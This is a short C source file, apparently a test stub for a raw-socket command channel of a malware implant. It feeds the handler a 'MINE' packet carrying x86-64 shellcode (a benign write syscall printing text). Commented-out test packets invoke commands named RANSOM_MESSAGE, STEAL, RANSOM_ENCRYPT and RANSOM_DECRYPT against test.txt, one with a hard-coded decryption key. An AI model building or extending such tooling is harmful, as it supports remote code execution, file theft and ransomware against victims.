#include "raw_socket_comms.h"
#include "debug.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char current_packet[2048];

int init_communication(void) {
	return 0;
}

void handle_incoming_messages(IncomingMessageHandler handler) {
	struct IncomingMessage *msg = (struct IncomingMessage *) &current_packet[0];

	memmove(msg->data, "MINE", 5);
	// memmove(msg->data + 5, "\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\xbe\x27\x00\x00\x00\x00\x00\x00\x00\xba\x0d\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x0a", 52);
	memmove(msg->data + 5, "\x6a\x0a\x48\xb8\x48\x49\x20\x57\x4f\x52\x4c\x44\x50\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x08\x00\x00\x00\x0f\x05", 33);
	handler(msg, 5 + 33);

	/*
	memmove(msg->data, "TEST", 5);
	memmove(msg->data + 5, "\x08""Content1Content2", 17);
	handler(msg, 5 + 17);

	memmove(msg->data, "TEST", 5);
	memmove(msg->data + 5, "\x80""Content", 8);
	handler(msg, 5 + 8);

	memmove(msg->data, "TEST", 5);
	memmove(msg->data + 5, "\x80""Content\x00", 9);
	handler(msg, 5 + 9);
	 */

	/*
	memmove(msg->data, "RANSOM_MESSAGE", 15);
	//memmove(msg->data + 15, "\x80""test.txt\x00", 10);
	memmove(msg->data + 15, "\x08""test.txtHELLO WORLD23456aaaabbbbccccddddeeeeffffgggghhhhi", 58);
	handler(msg, 15 + 58);

	memmove(msg->data, "STEAL", 6);
	memmove(msg->data + 6, "test.txt", 8);
	handler(msg, 6 + 8);

	memmove(msg->data, "RANSOM_ENCRYPT", 15);
	memmove(msg->data + 15, "test.txt", 8);
	handler(msg, 15 + 8);

	memmove(msg->data, "RANSOM_DECRYPT", 15);
	memmove(msg->data + 15, "\xd8\x45\x49\xa0\xec\x20\xeb\x23\xed\x6d\x1e\x66\x0e\x6e\xb9\x71" "test.txt", 24);
	handler(msg, 15 + 24);

	// */
}

void answerRequest(struct IncomingMessage *msg, const char *response, int len) {
	printf("Answer (%d bytes): \"%.*s\"\n", len, len, response);
	hexview(response, len);
}
